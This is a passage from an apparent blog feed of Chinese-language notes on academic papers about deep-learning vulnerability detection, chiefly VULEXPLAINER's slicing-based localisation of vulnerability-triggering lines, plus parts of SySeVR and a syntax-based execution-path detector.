种不同类型的漏洞。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945484.jpeg" alt="img"></p><p>对于第二个问题，本文比较了使用LR,MLP,DBN,CNN,LSTM,GRU,BLSTM,BGRU等神经网络进行训练和检测的效果，发现使用BGRU对SeVCs进行训练检测的效果最好。RNNs比CNN更好，CNN比浅层网络更好，假阴性率高于假阳性率(没检测出来的偏多)。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945496.jpeg" alt="img"></p><p>对于第三个问题，本文分别列举了在各个模型上只使用数据依赖(DD)和同时使用数据依赖控制依赖(DDCD)的模型结果，结果如下所示，可见控制依赖可以很大程度上提升模型的效果。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945558.jpeg" alt="img"></p><p>对于第四个问题，将本文的SySeVR-BGRU模型与Flawfinder,RATS,checkmarx,VUDDY，VulDeepecker进行比较，可见SySeVR-BGRU模型显著强于之前的所有模型。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290945707.jpeg" alt="img"></p><h3 id="总结">总结</h3><p>本文提出了一个叫做SySeVR的基于深度学习的代码漏洞检测框架，该模型提取待检测代码的语法和语义特征并应用于漏洞检测。大量的实验证明了SySeVR模型的有效性，本文使用SySeVR模型检测出NVD中15个未被报道过的漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Vulnerability Is in the Details Locating Fine-grained Information of Vulnerable Code Identified by Graph-based Detectors</title>
      <link href="/2023/12/18/Papers/Vul/VULEXPLAINER/"/>
      <url>/2023/12/18/Papers/Vul/VULEXPLAINER/</url>
      
        <content type="html"><![CDATA[<h2 id="0-abstract">0 Abstract</h2><p>漏洞检测是软件开发生命周期中的关键组成部分。现有的漏洞检测器，尤其是基于深度学习（DL）模型的检测器，已经取得了很高的效果。尽管它们能够从给定的代码片段中检测到易受攻击的代码片段，但通常无法进一步定位与漏洞相关的精细信息，比如精确的漏洞触发位置。在本文中，我们提出了VULEXPLAINER，这是一个用于自动定位由DL-based检测器报告的粗略级易受攻击代码片段中的漏洞关键代码行的工具。我们的方法利用了代码结构和漏洞的语义。具体来说，我们利用程序切片来获得一组包含漏洞触发和漏洞依赖语句的关键程序路径，并对它们进行排名，以确定最重要的一个（即子图），作为与漏洞相关联的数据流。我们证明了VULEXPLAINER在四个最先进的基于图表示（GP）的漏洞检测器上表现一致良好，即它可以针对八种常见的C/C++漏洞以约90％的准确率标记漏洞触发代码语句，优于五种广泛使用的基于GNN的解释方法。实验结果证明了VULEXPLAINER的有效性，它提供了一个有前景的研究线索：整合程序切片和深度学习来解释易受攻击的代码片段。</p><h2 id="1-intro-or-overview">1 Intro or Overview</h2><h3 id="11-problem-and-challenge">1.1 Problem and Challenge</h3><p>To counteract the potential exploitation, both academia and industrial communities have proposed numerous techniques for identifying and locating those vulnerabilities.</p><ul><li><p>传统方法，例如基于规则的分析技术利用预定义的签名或规则来识别漏洞。问题是，通常报告高误报和漏报率。</p></li><li><p>基于 DL 的检测技术通常在提取的代码特征表示上运行，已经显示出在标记包含漏洞的代码片段（即函数或片段）方面的巨大效果。然而，分析的粗粒度和黑盒性质使得检测结果的可解释性较差。<strong>例如，一个函数或代码片段可能包含十几行代码，这对开发人员来说仍然是一个具有挑战性的任务，以理解漏洞的根本原因并进一步采取行动来修复它们</strong>。解决这个问题的一种有希望的方法是利用解释方法来选择 DL-based 检测器的重要特征，然后将它们映射到相应的代码行。</p></li><li><p>最近图形解释技术的快速发展显示出了解决这个问题的巨大潜力。现有的图解释方法通常从三个角度促进模型的可解释性：为图边分配数值 [10]，[11]，计算节点的重要性分数 [12]，以及在通过 GNN 时计算图遍历的分数 [13]。</p></li></ul><p>尽管它们在诸如子图分类之类的任务中取得了成功，但现有的基于 GNN 的解释技术仍然存在固有的不足，这些不足阻碍了直接应用以获得有关漏洞的细粒度信息，例如触发代码行。</p><p>**第一个不足之处在于捕捉潜藏在良性和脆弱代码库中的微妙但丰富的语义能力有限。**程序的功能由提取的代码图中的语句（即节点）及其信息流（即边）定义。因此，针对程序的特定语义对于解释方法至关重要。然而，现有的解释方法无法定位到这种细粒度的信息，因为它们通常忽视了程序图中丰富的语义信息。</p><p>这可能归因于程序漏洞检测的复杂性相对于现有任务（即，较简单的拓扑结构）而言。<mark>例如，由边表示的两个语句之间的控制流或程序依赖关系几乎没有反映出来。此外，节点中包含的语义信息难以编码到潜在空间中。</mark></p><p>**第二个不足之处源于对关键漏洞检测语句的不足考虑。**大多数易受攻击的程序及其修补版本通常具有类似的拓扑结构，因为它们都包含触发漏洞的语句，如图1所示。唯一的区别可能在于一些修复漏洞的语句，涉及与漏洞触发相关的控制流和程序相关信息。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404190957908.png" alt="image-20240419095734769" style="zoom:50%;" /><h3 id="12-motivation">1.2 Motivation</h3><p>提出了VULEXPLAINER，这是一种新颖的方法，用于从GNN-based漏洞检测器报告的脆弱代码中识别细粒度信息。给定一个检测到的脆弱代码片段，VULEXPLAINER首先从中提取程序切片，然后构造控制和数据依赖信息。与先前的工作（例如，DEEPWUKONG[6]）相比，VULEXPLAINER仅保留脆弱性触发和脆弱性依赖的程序路径级信息，而不是完整程序的信息。这显着提高了分析效率，因为程序路径包含较少的代码行。利用程序切片方法，VULEXPLAINER捕获了更多包含在代码行中的语义信息。因此，它可以提供比仅关注拓扑特征的方法更准确的解释结果。</p><p><strong>VULEXPLAINER的目标是识别漏洞的根本原因。 最近的工作[14]表明，错误触发路径是定位和修复漏洞的关键。</strong> 因此，为了评估我们方法的有效性，我们提出了一个新的评估指标，漏洞触发代码行覆盖率（以下简称LC，在第V-B节中详细说明）。 我们对VULEXPLAINER的有效性进行多维评估。 在第一个比较维度中，我们将VULEXPLAINER应用于解释四种基于图代码表示的最新漏洞检测器的输出，包括DEEPWUKONG [6]，REVEAL [7]，IVDETECT [8]和DEVIGN [9]。 这四个检测器都使用程序依赖图（PDGs，DEVIGN仅使用数据依赖图，不使用控制依赖图）作为代码图表示。</p><h3 id="13-contribution">1.3 Contribution</h3><p>总之，我们做出以下主要贡献：</p><p>• 一种新颖的基于 GNN 的漏洞检测器的漏洞细粒度信息定位技术。鉴于现有的基于 GNN 的漏洞检测器的解释能力不足，我们提出了 VULEXPLAINER 框架作为解决方案。它可以识别程序中包含漏洞触发语句的重要流路径，为识别出的漏洞提供更细粒度的语义上下文。我们在匿名仓库 [16] 上发布了本文中使用的源代码和数据集。</p><p>• 方法效果。通过对全面基准数据集的多维评估，我们展示了 VULEXPLAINER 在 LC 方面优于现有的解释方法，LC 是影响漏洞定位和修复的关键因素。平均而言，VULEXPLAINER 对本研究中使用的所有漏洞检测器的 LC 均高于 85%，显示出对不同基于 GNN 的漏洞检测器的良好泛化能力。</p><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><h3 id="21-system-overview">2.1 System Overview</h3><h4 id="an-example-of-locating-vulnerability">AN EXAMPLE OF LOCATING VULNERABILITY</h4><p>如图 3 所示。它包含一个缓冲区溢出漏洞，该漏洞通过复制更多数据（即代码片段第 11 行定义的 100 字节）来触发，而数组的最大容量为（即代码片段第 2 行定义的 50 字节）。基于 GNN 的漏洞检测器只输出检测结果为 1，表明代码片段是易受攻击的（或反之为 0）。漏洞定位任务的目标是构建一个包含漏洞触发代码行和漏洞相关变量的关键赋值的控制和数据依赖路径，或者此后称为流路径。为此，我们首先通过将语句映射到节点并根据节点之间的依赖信息构造流路径将源代码转换为图形表示。从路径中，我们选择满足我们漏洞定位目标的路径。具体来说，在图 3 中我们的示例中，从原始代码片段中提取了多条流路径，<strong>例如“8-11”、“2-6-7-13”等。其中，“2-6-7-11”被认为是最关键的路径，因为既包括第 2 行（关键变量赋值）又包括第 11 行（漏洞触发）。</strong><br>技术挑战。根据这个漏洞定位示例，对于一般和自动定位检测到的漏洞代码，技术挑战至少有两个方面：<br>• 挑战#1 <strong>通过基于 GNN 的检测器正确检测到易受攻击的代码后，缺乏一种有效的漏洞定位方法，该方法生成覆盖漏洞触发和相关关键变量赋值的流路径。</strong><br>• 挑战#2 <strong>给定生成的流路径，缺乏一种有效的路径选择机制，该机制识别最合适的路径作为检测到的漏洞的最合理最终数据流</strong>。为了解决这两个挑战，我们提出了 VULEXPLAINER，它可以从代码片段中导出的 PDG 中自动生成可行的流路径，并对它们进行排名以选择最合理的路径。该框架的技术细节将在第四节中介绍。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191945690.png" alt="image-20240419194551637" style="zoom:67%;" /><h4 id="locating-vulnerability-statements-using-gnn-based-detectors">LOCATING VULNERABILITY STATEMENTS USING GNN-BASED DETECTORS</h4><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191959536.png" alt="image-20240419195905435" style="zoom:67%;" /><ul><li>流路径生成。</li></ul><p>给定一个以图形表示的脆弱代码片段，其控制和数据依赖已计算（见图4(a)），VULEXPLAINER 首先识别程序中可能触发漏洞的语句（即节点），表示为潜在汇点（potential sink points，PSPs）。接下来，VULEXPLAINER 在程序图中沿着从 PSP 开始的流路径迭代遍历，直到到达 PSP 的源（例如，表示关键变量赋值的节点）。类似地，VULEXPLAINER 生成图中所有符合条件的流路径，每个流路径以一个 PSP 结束。</p><ul><li>流程路径选择。</li></ul><p>VULEXPLAINER首先对每个流程路径进行向量化，并计算与漏洞概率相关的重要性分数（见图4(b)）。接下来，VULEXPLAINER选择具有最高重要性分数的流程路径作为漏洞数据流。请注意，我们不会直接针对路径选择训练分类器，因为每个路径被视为数据流而不是代码片段。</p><h4 id="流路径生成">流路径生成</h4><p>从原始代码图（即PDG）生成流路径，我们利用基于DLVD方法的程序切片，这种方法已被之前的作品广泛采用，例如DEEPWUKONG，REVEAL，IVDETECT，DEVIGN。切片原理基于PDG的控制依赖和数据依赖。更具体地，详细的流路径生成方法由算法1中的“GENERATESLICE”函数描述。它以代码图G和路径长度限制k（即，为了有效地移除后续搜索中的冗长路径）作为输入。我们将算法详细描述如下。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404192022921.png" alt="image-20240419202206854" style="zoom:67%;" /><h4 id="流路径选择">流路径选择</h4><p><strong>在流程路径中，我们的目标是根据预测结果选择一个可以最好地定位触发漏洞的语句的路径。</strong></p><p>关键直觉是，如果一条路径包含了PSP及其源节点，则应选择该路径。例如，第III节中的示例中的路径“2 - 6 - 7 - 11”。如果有多条符合条件的路径，我们进一步根据路径重要性对它们进行排名，并选择具有最高重要性得分的路径。更正式地说，给定一个代码图G，我们从中提取流程路径并对每个流程路径进行向量化。</p><p>向量化一个流程路径的过程与检测器向量化相应代码图的过程相同。然后，我们通过将每个向量化的流程路径视为原始代码图的子图并将其输入经过良好训练的基于GNN的漏洞检测器来计算每个流程路径的重要性得分。这个过程可以正式描述为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404192040306.png" alt="image-20240419204002233"></p><p>在这里，g 是从 G 中提取的流路径，Φ 是基于 GNN 的漏洞检测器之一。最后，我们计算每条路径的重要性分数 ISg，衡量它们对于检测器预测相应代码片段的贡献。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404192040633.png" alt="image-20240419204044559"></p><p>假设在对G进行切片后有n个流路径，表示为{g1, …, gi, …gn}。漏洞数据流g∗表示为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404192041488.png" alt="image-20240419204114457"></p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404192030658.png" alt="image-20240419203043537" style="zoom:67%;" /><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><p>评估了VULEXPLAINER在DEEPWUKONG、REVEAL、IVDETECT和DEVIGN的预测结果中定位漏洞语句的有效性。评估是为了检测CWE中排名前30位的8个漏洞，与GNN的五种最先进的解释器进行比较。为此，我们概述了本研究中使用的数据集以及涉及其标记过程（第V-A节）。接下来，我们详细阐述了实验设置。</p><h3 id="31-dataset-and-process">3.1 DataSet and Process</h3><p>目标漏洞：此处使用的数据集必须支持细粒度检测，这需要明确的有关易受攻击代码行的信息。许多实际数据集中的缺陷行，如DEVIGN [9]，REVEAL，Fan [26]，都标有从提交的版本修补程序中提取的代码更改信息。如图7所示，包含CVE-2015-2029漏洞ID的示例代码包括标记为绿色的漏洞修复代码行。<strong>然而，这种标记方法只能检测到漏洞修复行，而未检测到漏洞触发行。</strong></p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404192212129.png" alt="image-20240419221207069" style="zoom:67%;" /><p>在图7中的同一示例中，受污染流程中的语句被标记为粉红色，这并未涵盖触发漏洞的代码行。此外，fA函数处修复的漏洞可能会在fB函数处触发。在这种情况下，fA将被标记为易受攻击，而fB则为非易受攻击。更糟糕的是，Roland Croft等人[27]报告了真实数据集中约20-71%的假阳性漏洞样本的存在。由上可见，在实际数据集中准确标记易受攻击的代码行可能具有挑战性。由于噪声数据集可能会影响深度学习模型的性能[28]，我们从SARD [24]，一个合成漏洞数据库中组装我们的数据集。在SARD数据集中，每个程序（即测试用例）可能与一个或多个CWE ID相关联，因为一个程序可能包含不同类型的漏洞。更重要的是，每个易受攻击程序的触发漏洞语句已经被正确标记。我们的目标是检查2021年C/C++中30种最危险的软件缺陷中的八种，具体关注CWE20，CWE22，CWE78，CWE119，CWE125，CWE190，CWE400和CWE787。我们使用与DEEPWUKONG [6]相同的网络爬虫来收集所有可用程序。</p><p><strong>基准数据集处理：从 SARD 收集的数据按以下步骤进行处理。首先，我们将 SARD 程序的功能解析为供 REVEAL 和 IVDETECT 使用的 CPGs。我们直接利用由 DEEPWUKONG 生成的切片级别 XFGs（PDG 的子图），因为它们在其存储库中可用。然后，我们按照先前的工作对这些 CPGs 和 XFGs 进行标记和去重。任何包含一个或多个易受攻击语句的 CPG 或 XFG 将被标记为易受攻击，反之亦然。除此之外，我们将易受攻击样本中的关键语句标记为节点索引。</strong></p><p>基准数据集分布：经过处理阶段，我们从 SARD 数据集中收集了 82,243 个易受攻击的 CPGs 和 164,736 个非易受攻击的 CPGs，如表 I 所示。我们从 DEEPWUKONG 下载了 XFGs 数据集。重新标记后，我们总共组装了 151,774 个易受攻击的 XFGs 和 384,062 个非易受攻击的 XFGs。</p><h3 id="32-evaluation">3.2 <strong>Evaluation</strong></h3><p>评估指标：我们首先使用六个常用的指标评估四种漏洞检测工具的有效性，包括准确率（ACC）、误报率（FPR）、漏报率（FNR）、召回率（R）、精确率（P）、F1分数（F1）。简化结果总结在表II中，详细结果可在我们的存储库[16]中找到。</p><p>评估解释方法以及VULEXPLAINER的有效性，我们提出度量<strong>行覆盖率</strong>，即LC。请注意，评估指标仅适用于真正阳性样本，即标记并检测为易受攻击的样本。**LC的定义如下：给定包含n个易受攻击代码行的代码片段C的流路径g，则LC = n/m，其中m（m ≥ n）表示数据集中标记为易受攻击的代码行的总数。**如果g包含数据集中标记的所有易受攻击语句，则LC为1；如果g不包含标记的易受攻击语句，则LC为0。</p><p>请注意，我们考虑使用忠实度[36]来衡量解释器和VULEXPLAINER的性能。然而，目前缺乏一种通用且标准的计算忠实度的方法，导致不同方法得出的结果差异巨大。这使得将忠实度作为评估指标之一变得不可靠。此外，我们的目标是定位和解释检测到的漏洞的原因，并不一定需要构建一个最大程度保留原始图属性的子图。</p><h4 id="rq1-vulexplainer能否准确定位触发漏洞的代码行">RQ1 VULEXPLAINER能否准确定位触发漏洞的代码行？</h4><p>设置两个参数，sparsity和k，用来控制flow path的节点数量，参数稀疏度由 1 − n/m 计算，其中 m 和 n 分别是图中和路径中的节点总数。直观地说，稀疏度控制着图中节点的分布均匀程度。更多节点集中在较少的路径中（即相对较长的路径）会导致较低的稀疏度。参数 k 指定了路径中的节点最大数量，如算法 1 所述。考虑这两个参数，流路径中的最大节点数 MaxN 由 min(k, (1 − 稀疏度) ∗ m) 给出。</p><p><strong>RQ1.1：VULEXPLAINER在各种类型的漏洞中能否表现一致？</strong></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404201003834.png" alt="image-20240420100351781"></p><p>如表III所示，VULEXPLAINER在定位不同类型的漏洞时表现出不同的性能。对于CWE-78漏洞，它取得了最高的LC分数（98％），对于CWE-20（84％）和CWE-119（87％）则相对较低。为了更好地理解这种差异背后的原因，我们对几个特殊案例进行了手动审查，并确认了以下三个可能的原因。</p><p>首先，所选的PSPs可能是不完整的。各种类型的语句可能会触发漏洞。某些漏洞，比如CWE-78，只能通过与系统命令相关的API触发，使得漏洞模式相对比较简单。然而，其他类型的漏洞（例如缓冲区溢出）可能会被各种语句触发，包括与内存相关的API、数组操作和指针操作。这导致代码图中出现更多的PSPs，随后在路径生成和选择过程中产生更多的干扰，这对我们的方法构成挑战。此外，我们目标的PSP模式可能不完整，可能会在解释过程中排除某些漏洞类型。</p><p>我们利用程序切片生成流程路径，以保留漏洞语义。在这个过程中，我们会筛选掉一些与漏洞有关的控制和数据依赖关系，而不包含变量。然而，使用我们的方法分析大量路径可能会变得困难，考虑到要探索和解析的指数级扩展可能性。</p><p>基于深度学习的检测器并不像我们期望的那样可靠。在某些情况下，检测器的输出分数显著低于预期，即使路径与漏洞强相关。这种不可靠性可能会影响到VULEXPLAINER的测量有效性。这也表明传统评估指标可能无法完全捕捉这些检测器的有效性。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404201011857.png" alt="image-20240420101118758" style="zoom:50%;" /><p><strong>RQ1.2：VULEXPLAINER在不同基于图的漏洞检测器上能否表现一致？换句话说，VULEXPLAINER的性能是否受到检测器选择的影响？</strong></p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404201011256.png" alt="image-20240420101152223" style="zoom:50%;" /><h4 id="rq2-vulexplainer能否超越现有的gnn漏洞检测解释方法">RQ2 VULEXPLAINER能否超越现有的GNN漏洞检测解释方法？</h4><p>结果：在使用评估指标LC对八种漏洞进行评估时，VE在比较中超越了所有五种解释方法。由于当k的值变化时可以观察到解释器表现的相同趋势，我们基于页面约束使用k = 7呈现和分析最终结果。以CWE-20为例，基于DEEPWUKONG的预测定位易受攻击行时，VE在LC方面比GL大约30%。至于CWE-125，用于REVEAL的定位易受攻击行时，GR仅获得51%的LC，而我们的方法达到96%。对于IVDETECT，DL仅获得4%的LC，而VE达到97%。与GE相比，在CWE-787上为DEVIGN定位易受攻击行时，VE达到91%的LC，几乎比GE高出33%。对于PE也观察到类似的模式，仅实现33%的LC。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404201020607.png" alt="image-20240420102009538"></p><p>分析：实验结果表明，仅依赖节点嵌入和代码图的拓扑结构来定位易受攻击代码片段的根本原因是不足够的。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404201018628.png" alt="image-20240420101815581"></p><h2 id="4-discussion">4 Discussion</h2><p>首先，我们只在SARD数据集上进行实验，该数据集包含合成和学术程序，但可能不代表真实世界的软件产品。我们在第V-A节中讨论了现有真实世界数据集中的问题。生成可靠的细粒度数据集仍然是一个悬而未决的问题。其次，我们的框架使用关键库API调用、数组或指针操作和操作符语句来执行程序切片作为PSPs。如第VI-A1节所述，这意味着某些边缘情况可能被忽视。此外，它还可能引入无关的语句作为汇点。增强我们的方法的一种方式是检测附加的补充类型的PSP模式，随后筛选出多余的汇点以减少潜在的不准确性。这需要对触发真实世界漏洞以及如何修复这些漏洞有额外的见解。我们只考虑分析PSPs，虽然进一步分析与漏洞相关数据输入到程序的潜在源点是一个有希望的对角线研究方向。第三，我们的实验仅限于C/C++程序中的八种漏洞类型。尽管如此，我们的方法可以轻松扩展到包括其他源-汇漏洞和其他编程语言。第四，我们的方法仅考虑基于四种基于图的漏洞检测器定位脆弱语句。然而，我们的方法很容易适用于其他检测器，并有可能用于其他程序分析任务。</p><h2 id="conclusion">Conclusion</h2><aside> 💡 Others<hr><h4 id="基于gnn的漏洞检测器">基于GNN的漏洞检测器</h4><p>最近，安全分析师和研究人员在漏洞检测任务中已经开始利用GNNs [9]，[7]，[8]，[6]，[17]，[18]。他们假设代码的图表示相对于传统的基于序列的表示方式，可以更好地保留与漏洞相关的程序的关键语义信息。通常，最常用的图表示是代码属性图（CPG），它与抽象语法树（AST）、控制流图（CFG）、控制依赖图（CDG）和数据依赖图（DDG）相结合。此外，另一种图表示程序依赖图（PDG）由CDG和DDG组成，可以被视为CPG的子结构，在程序切片中被广泛使用。在本研究中，我们主要利用PDG进行切片。通常，基于GNN的检测器的检测阶段通常包括三个步骤，如图2所示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191939483.png" alt="image-20240419193946385"></p><ul><li>将源代码解析为图形表示。</li></ul><p>目标源代码片段通常是函数或片段。在这里，我们利用Joern [20]来转储代码片段的图形表示，以支持那些基于GNN的检测器（DEEPWUKONG [6]，REVEAL [7]，IVDETECT）。</p><ul><li>将代码图嵌入到向量化表示中。</li></ul><p>在代码图中，一个节点通常代表一个程序语句，而一条边表示两个语句之间的关系（执行顺序或 def-use）。在这里，每个节点可以通过 DOC2VEC [21] 或 WORD2VEC [22] 进行向量化。然后，通过顺序向量化所有包含的节点生成向量化图数据。</p><ul><li>使用训练良好的 GNN 模型对向量化代码图进行分类。</li></ul><p>通过代码片段的向量化图和它们的标签，可以训练 GNN 模型，如图卷积网络（GCN）和门控图神经网络（GGNN），来检测目标程序的向量化图数据。</p><h4 id="控制和数据依赖关系">控制和数据依赖关系</h4><p>在一个PDG中，控制依赖边Si → Sj表示Sj语句是否会根据Si中的约束条件执行。数据依赖边S′ i → S′ j意味着在S′ j中使用了在S′ i中定义的值。并且在从S′ i到S′ j的路径上没有其他语句重新定义相应的值。程序的控制依赖图可以通过Cytron R等人提出的算法确定。而数据依赖关系可以通过到达定义分析计算。</p><h4 id="potential-sink-pointspsps">Potential Sink Points（PSPs）</h4><p>PSPs是与漏洞关系密切的语句。在算法1中，它们由函数“ExtractSinkNode”（第3行）提取，该函数考虑了我们程序切片中以下四种类型的PSPs。我们采用了李等人提出的相同定义[25]。</p><p>函数库/API函数调用（FC）</p><p>这种类型的PSP几乎涵盖了除整数溢出之外的所有漏洞类型。不同类型的漏洞由各种类型的API调用触发。例如，操作系统命令注入通常由诸如system和execl之类的API触发，而缓冲区溢出通常由类似memcpy的数据复制函数触发。</p><p>数组使用（AU）。</p><p>这种类型的PSP通常出现在内存错误中。在本研究中，AU仅涵盖缓冲区溢出漏洞。例如，“data[i] = 1;”可能导致缓冲区溢出。请注意，我们在这项工作中不考虑诸如带有常量索引的数组访问等微不足道的情况。</p><p>指针使用（PU）。</p><p>与AU类似，PU通常出现在内存错误中。本研究仅涵盖缓冲区溢出漏洞。</p><p>算术表达式（AE）。</p><p>这种类型的PSP通常是像“a + 1”或“a++”这样的算术表达式。AE通常与整数溢出和除零漏洞有关。在这里，我们主要关注前者。请注意，在这项工作中我们不考虑诸如带有条件检查的自增和自减操作等微不足道的情况。</p><h4 id="dependent-statement">Dependent Statement</h4><p>算法1中的函数“ExtractPrecNodes”（第19行）建立了节点“n”的依赖关系（即识别节点“n”依赖的节点）。我们发现，并非每个节点“n”的依赖关系都与漏洞有关，因为源代码语句可能包含多个表达式，其中仅有一个可能触发漏洞。因此，在提取依赖节点时，我们只关注涉及每个PSP相关关键变量的控制和数据依赖。在图5中进行说明，我们的工具识别了可能触发语句S3中整数下溢的算术操作“CHAR ARRAY SIZE - 1”。虽然S3通过变量“connectSocket”与S1存在数据依赖，但它们不出现在算术操作中。因此，在进行切片时，我们不考虑数据依赖边“S1 - S3”。对于其他节点，我们考虑当前节点的所有依赖语句。</p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnerability Detection by Learning From Syntax-Based Execution Paths of Code</title>
      <link href="/2023/12/18/Papers/Vul/Vulnerability%20Detection%20by%20Learning%20From%20Syntax-Based%20Execution%20Paths%20of%20Code/"/>
      <url>/2023/12/18/Papers/Vul/Vulnerability%20Detection%20by%20Learning%20From%20Syntax-Based%20Execution%20Paths%20of%20Code/</url>
      
        <content type="html"><![CDATA[<h2 id="0-abstract">0 Abstract</h2><p>在这项工作中，我们提出将代码片段的基于语法的控制流图（CFG）分解为多个执行路径来检测漏洞。具体来说，给定一个代码片段，我们首先基于它的抽象语法树（AST）构建它的CFG，将这种CFG称为基于语法的CFG，并将CFG分解为从入口节点到出口节点的多个路径。接下来，我们采用预先训练的代码模型和卷积神经网络来学习具有路径内和路径间注意力的路径表示。路径的特征向量被组合为代码片段的表示，并被输入分类器以检测漏洞。将代码片段分解为多个路径可以过滤掉一些与漏洞无关的冗余信息，并帮助模型关注漏洞特征。此外，由于分解的路径通常比代码片段短，位于长代码尾部的信息更有可能被处理和学习。为了评估我们模型的有效性，我们构建了一个包含超过231k个代码片段的数据集，其中有24k个漏洞。实验结果表明，所提出的方法在精度、召回率和F1分数方面分别优于最先进的基线至少22.30%、42.92%和32.58%。我们的进一步分析调查了所提出的方法优越性的原因。</p><h2 id="1-intro-or-overview">1 Intro or Overview</h2><h4 id="11-problem-and-challenge">1.1 Problem and Challenge</h4><p>漏洞检测对于保护软件系统至关重要。已经提出了基于深度学习的各种方法来学习漏洞模式并识别它们。尽管这些方法在这项任务中显示出了巨大的潜力，但它们仍然存在以下问题：<mark>（1）它们很难将与漏洞相关的信息与大量无关的信息区分开来，这阻碍了它们捕捉漏洞特征的有效性。</mark>（2） <mark>它们在处理长代码方面效果较差，因为许多神经模型会限制输入长度，这阻碍了它们表示长时间易受攻击的代码片段的能力。</mark></p><h4 id="12-motivation">1.2 Motivation</h4><p>Observation 1: A vulnerable function may contain a vast of statements unrelated to vulnerabilities.</p><p>Observation 2: Truncating the statements in the tail of a long code snippet may negatively affect the effectiveness of vulnerability detection.</p><h4 id="13-contribution">1.3 Contribution</h4><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><h4 id="21-system-overview">2.1 System Overview</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403151148919.png" alt="image-20240315114845862"></p><p>形式上，我们采用Gi=（Vi，Ei）来表示代码片段ci的基于语法的CFG，其中Vi=（v1 i，v2 i，…v|Vi|i）是包含|Vi|语句的节点集。Ei是表示语句之间的控制流的边集。每条边都是ci中两个语句之间的关系，因此一个语句可以在另一个语句之后执行。Gi中的路径是节点序列p=（n1，n2，…，nk），其中节点nk是ci的陈述k。对于任何一对相邻节点np和nq，存在从np到nq的边。如果起始节点等于结束节点，则路径将是一个循环。</p><p>首先将每个代码片段解析为AST，并根据AST构建基于语法的CFG。接下来，我们提出了一种基于贪婪的路径选择算法，从基于语法的CFG中选择多个执行路径，即将代码片段分解为几个执行路径。然后，通过CodeBERT[24]将所选路径编码为具有路径内注意力的向量，然后将其馈送到CNN中以捕获路径间注意力。最后，我们利用MLP分类器来执行检测。</p><h4 id="22-method">2.2 Method</h4><p>Construction of Control Flow Graph From AST</p><p>该阶段以代码片段为输入，使用tree-sitter[50]将其解析为AST，并从AST构建基于语法的CFG。在本节中，我们使用图3中的示例来说明我们如何从代码片段的AST构建基于语法的CFG。在构造CFG之前，我们使用正则表达式删除代码段中的空行和注释。我们还在代码中标记每条语句的行号。由于基于语法的CFG中的每个节点代表一个单独的语句，因此在构造CFG时，我们只考虑AST中的语句节点。为了简化演示，我们做出以下定义：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403151615419.png" alt="image-20240315114834197"></p><p>简单语句：在AST中不包含其他语句的语句。</p><p>Next语句：节点的Next语句是指在执行节点后可能执行的语句。一个节点可能有多个Next语句。</p><p>非子Next语句：节点的非子Next声明是指该节点的Next语句，不包含在以该节点为根的子树中。</p><p>Normal语句：不是break_语句、continue_Statement、return_Statement和throw_Statement的语句。</p><p>为了构造代码段的基于语法的CFG，我们首先将代码段的所有语句添加到CFG中作为其节点，并将第一个语句视为入口节点，将所有return_statement、assert_statement和throw_statement视为出口节点。如果代码片段的最后一条语句不是出口节点，我们将在代码末尾添加一个伪出口节点。然后，我们以广度优先的方式遍历AST，并为每个语句类型设计规则，以在CFG中构建边。</p><p>1） 对于每个既是简单语句又是普通语句的语句，如果AST中存在其下一个同级语句，我们将其连接到此同级语句。例如，在图3中，我们将节点2连接到节点3，将节点3连接到节点4。</p><p>2） 对于每个循环语句，即For_statement和while_statement，如果存在这样的语句，我们将其与第一个子语句和下一个同级语句连接起来。如果它的最后一个子语句是Normal语句，我们将此语句连接到循环语句。例如，在图3中，我们将节点4连接到节点5，将节点4与节点10连接，将节点5与节点4连接。</p><p>3） 对于每个break_statement，我们首先找到它的第一个祖先，它是沿着AST的循环语句或switch_statement。然后，我们将其连接到祖先的非子下一个语句。</p><p>4） 对于每个continue_statement，我们首先找到它的第一个祖先，即沿着AST的循环语句。然后，我们把它和这个祖先联系起来。</p><p>5） 对于每个if_statement，如果存在这样的语句，我们首先将其连接到其下一个同级语句，如果最后一个子语句是Normal语句，则将其then_block的最后一个子声明连接到其当前next语句。例如，在图3中，我们将节点6连接到节点4，将节点7连接到节点4.将节点10连接到节点12，将节点11连接到节点12。然后，如果它的子级包含else_statement，我们将else_Statements连接到它的每个Next Statements，将if_statement中的边移除到它的Next 